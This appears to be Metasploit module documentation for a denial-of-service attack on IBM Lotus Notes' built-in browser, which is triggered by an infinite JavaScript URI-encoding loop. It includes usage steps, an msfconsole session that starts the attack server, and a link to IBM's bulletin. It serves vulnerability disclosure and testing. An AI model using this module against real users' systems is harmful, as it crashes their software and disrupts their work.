## Vulnerable Application

This module exploits a vulnerability in, inbuilt web-browser of IBM lotus notes, the code uses java-script based URI encoding,
and create a object instance of encode URI due to the infinite loop it leads to Denial of Service.

## Working of Module

1. Start msfconsole
2. `use auxiliary/dos/http/ibm_lotus_notes.rb`
3. Set `SRVHOST`
4. Set `SRVPORT`
5. run (Server started)
6. Visit server URL in web-browser of IBM

```
msf > use auxiliary/dos/http/ibm_lotus_notes 
msf auxiliary(ibm_lotus_notes) > show options 

Module options (auxiliary/dos/http/ibm_lotus_notes):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Auxiliary action:

   Name       Description
   ----       -----------
   WebServer  


msf auxiliary(ibm_lotus_notes) > set SRVHOST 192.168.0.50
SRVHOST => 192.168.0.50
msf auxiliary(ibm_lotus_notes) > set SRVPORT 9092
SRVPORT => 9092
msf auxiliary(ibm_lotus_notes) > run
[*] Auxiliary module execution completed
msf auxiliary(ibm_lotus_notes) > 
[*] Using URL: http://192.168.0.50:9092/ImlbHZVXlvTEXYd
[*] Server started.
msf auxiliary(ibm_lotus_notes) > 
```

Security Bulletin: http://www-01.ibm.com/support/docview.wss?uid=swg21999385
